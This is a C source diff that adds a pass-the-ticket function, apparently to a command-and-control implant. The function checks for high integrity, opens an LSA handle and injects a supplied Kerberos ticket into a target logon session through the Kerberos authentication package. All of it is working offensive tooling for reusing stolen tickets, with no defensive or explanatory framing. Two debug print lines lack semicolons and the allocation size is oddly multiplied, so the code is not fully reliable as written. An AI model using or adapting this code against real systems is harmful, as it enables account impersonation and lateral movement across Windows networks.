@@ -374,6 +374,86 @@ VOID CopySessionInfo( PSESSION_INFORMATION Session, PSECURITY_LOGON_SESSION_DATA
     StringCopyW( Session->Upn, Data->Upn.Buffer );
 }
 
+BOOL Ptt( HANDLE hToken, PBYTE Ticket, DWORD TicketSize, LUID luid )
+{
+    BOOL                     highIntegrity  = FALSE;
+    HANDLE                   hLsa           = NULL;
+    LSA_STRING               krbAuth        = {.Buffer = "kerberos", .Length = 8, .MaximumLength = 9};
+    NTSTATUS                 status         = STATUS_UNSUCCESSFUL;
+    NTSTATUS                 protocolStatus = STATUS_UNSUCCESSFUL;
+    ULONG                    authPackage    = 0;
+    PKERB_SUBMIT_TKT_REQUEST submitRequest  = NULL;
+    DWORD                    submitSize     = sizeof( KERB_SUBMIT_TKT_REQUEST ) + TicketSize;
+    PVOID                    response       = NULL;
+    ULONG                    responseSize   = 0;
+
+    if ( ! hToken )
+        return FALSE;
+
+    highIntegrity = IsHighIntegrity( hToken );
+    if ( ! highIntegrity )
+    {
+        PUTS( "[!] Not in high integrity." );
+        return FALSE;
+    }
+
+    status = GetLsaHandle( hToken, highIntegrity, &hLsa );
+    if ( ! NT_SUCCESS( status ) || ! hLsa )
+    {
+        PRINTF( "[!] GetLsaHandle %ld\n", status );
+        return FALSE;
+    }
+
+    status = Instance.Win32.LsaLookupAuthenticationPackage( hLsa, &krbAuth, &authPackage );
+    if ( ! NT_SUCCESS( status ) )
+    {
+        PRINTF( "[!] LsaLookupAuthenticationPackage %lx\n", status );
+        Instance.Win32.LsaDeregisterLogonProcess( hLsa );
+        return FALSE;
+    }
+
+    submitRequest = Instance.Win32.LocalAlloc( LPTR, submitSize * sizeof( KERB_SUBMIT_TKT_REQUEST ) );
+    if ( ! submitRequest )
+    {
+        Instance.Win32.LsaDeregisterLogonProcess( hLsa );
+        return FALSE;
+    }
+
+    submitRequest->MessageType    = _KerbSubmitTicketMessage;
+    submitRequest->KerbCredSize   = TicketSize;
+    submitRequest->KerbCredOffset = sizeof( KERB_SUBMIT_TKT_REQUEST );
+
+    if ( highIntegrity )
+    {
+        submitRequest->LogonId = luid;
+    }
+
+    MemCopy( RVA( PBYTE, submitRequest, submitRequest->KerbCredOffset ), Ticket, TicketSize );
+
+    status = Instance.Win32.LsaCallAuthenticationPackage( hLsa, authPackage, submitRequest, submitSize, &response, &responseSize, &protocolStatus );
+
+    if ( ! NT_SUCCESS( status ) )
+    {
+        PRINTF( "[!] LsaCallAuthenticationPackage: %lx\n", status )
+        Instance.Win32.LsaDeregisterLogonProcess( hLsa );
+        Instance.Win32.LocalFree( submitRequest ); submitRequest = NULL;
+        return FALSE;
+    }
+
+    if ( ! NT_SUCCESS( protocolStatus ) )
+    {
+        PRINTF( "[!] LsaCallAuthenticationPackage: %lx\n", protocolStatus )
+        Instance.Win32.LsaDeregisterLogonProcess( hLsa );
+        Instance.Win32.LocalFree( submitRequest ); submitRequest = NULL;
+        return FALSE;
+    }
+
+    Instance.Win32.LocalFree( submitRequest ); submitRequest = NULL;
+    Instance.Win32.LsaDeregisterLogonProcess( hLsa );
+
+    return TRUE;
+}
+
 BOOL Purge( HANDLE hToken, LUID luid )
 {
     BOOL                         highIntegrity  = FALSE;
